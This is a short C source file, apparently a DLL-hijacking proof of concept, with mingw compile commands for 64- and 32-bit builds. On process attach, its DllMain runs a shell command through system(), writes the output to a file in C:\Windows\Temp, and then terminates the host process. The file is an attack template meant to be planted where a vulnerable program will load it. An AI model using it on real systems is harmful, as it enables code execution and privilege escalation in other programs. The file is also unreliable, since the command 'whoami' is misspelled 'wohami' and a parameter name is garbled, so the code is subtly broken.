// For x64 compile with: x86_64_w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReversed) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		system("cmd.exe /k wohami > C:\\Windows\\Temp\\dll.txt");
		ExitProcess(0);
	}
	return TRUE;
}